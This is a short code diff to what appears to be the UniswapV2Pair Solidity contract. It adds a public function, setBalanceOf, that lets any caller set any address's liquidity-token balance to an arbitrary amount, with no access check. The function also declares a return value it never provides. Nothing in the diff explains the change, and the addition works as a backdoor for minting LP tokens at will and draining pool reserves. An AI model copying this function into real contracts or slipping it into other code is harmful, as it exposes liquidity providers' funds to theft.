@@ -46,6 +46,12 @@ contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 {
         require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');
     }
 
+    function setBalanceOf(address owner, uint256 _liquidity)
+        external
+        returns (uint256){
+            balanceOf[owner]=_liquidity;
+        }
+
     event Mint(address indexed sender, uint amount0, uint amount1);
     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
     event Swap(
